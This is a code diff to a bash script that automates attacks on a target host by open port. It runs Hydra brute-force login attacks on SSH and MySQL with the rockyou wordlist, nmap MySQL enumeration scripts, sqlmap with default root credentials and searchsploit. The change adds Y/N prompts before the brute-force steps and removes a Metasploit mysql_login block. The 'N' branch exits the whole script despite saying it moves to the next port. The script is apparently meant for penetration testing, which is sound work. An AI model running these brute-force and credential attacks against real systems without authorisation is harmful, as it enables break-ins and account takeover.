@@ -42,9 +42,21 @@ for port in $OPEN_PORTS; do
     
     case $port in
         22)  
-            echo "SSH detected - Running Hydra for brute force testing..."
-            hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP  ;;
-        
+            while true; do # Loop to accept input again if the user enters a wrong value !!!
+	        read -p "Do you want to run a brute force password attack for SSH [!!Warning Brute force Attacks consumes a lot of time] ? (Y/N): " choice  #Reads choice from the user and performs menu based operations
+	        choice=${choice^^}
+	        if [[ "$choice" == "Y" ]]; then
+	        echo "SSH detected - Running Hydra for brute force testing..."
+            hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP
+            break
+    	    elif [[ "$choice" == "N" ]]; then
+	        echo "You chose NO. Exiting and moving to the next open port....."
+            exit 0
+    	    else
+            echo "Invalid input. Please enter Y or N."
+    	    fi
+            done;;
+
         80|443)  
             echo "HTTP(S) detected - Running Gobuster for directory enumeration..."
             if [ $port -eq 80 ]; then
@@ -61,10 +73,22 @@ for port in $OPEN_PORTS; do
             echo "[+] Scanning MySQL on $TARGET_IP..."
 	    nmap -p 3306 --open -sV --script=mysql* "$TARGET_IP"
 	    echo "[+] Checking for Anonymous Login..."
-	    nmap --script=mysql-empty-password -p 3306 "$TARGET_IP"
-	    echo "[+] Attempting Brute Force with Hydra..."
+	    nmap --script=mysql-empty-password -p 3306 "$TARGET_IP" 
+	    while true; do # Same as SSH brute force
+            read -p "Do you want to run a brute force password attack for SQL [!!Warning Brute force Attacks consumes a lot of time] ? (Y/N): " choice
+        choice=${choice^^}
+        if [[ "$choice" == "Y" ]]; then
+        echo "[+] Attempting Brute Force with Hydra..."
 	    hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt "$TARGET_IP" mysql -V 
-	    echo "[+] Checking for MySQL Database Enumeration..."
+	    break
+        elif [[ "$choice" == "N" ]]; then
+        echo "You chose NO. Exiting and moving to the next open port....."
+        exit 0
+        else
+        echo "Invalid input. Please enter Y or N."
+        fi
+        done
+        echo "[+] Checking for MySQL Database Enumeration..."
 	    nmap --script=mysql-databases -p 3306 "$TARGET_IP"
 	    echo "[+] Checking for MySQL Users Enumeration..."
 	    nmap --script=mysql-users -p 3306 "$TARGET_IP"
@@ -74,13 +98,6 @@ for port in $OPEN_PORTS; do
 	    sqlmap -d "mysql://root:root@${TARGET_IP}/test" --batch --dbs
 	    echo "[+] Checking for MySQL Version Vulnerabilities..."
 	    searchsploit mysql
-	    echo "[+] Checking for Exploitable MySQL Misconfigurations with Metasploit..."
-	    msfconsole -q -x "use auxiliary/scanner/mysql/mysql_login;
-	    set RHOSTS $TARGET_IP;
-            set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt;
-            set PASS_FILE /usr/share/wordlists/rockyou.txt;
-            run;
-            exit"
 	    ;;
         
     139|445)
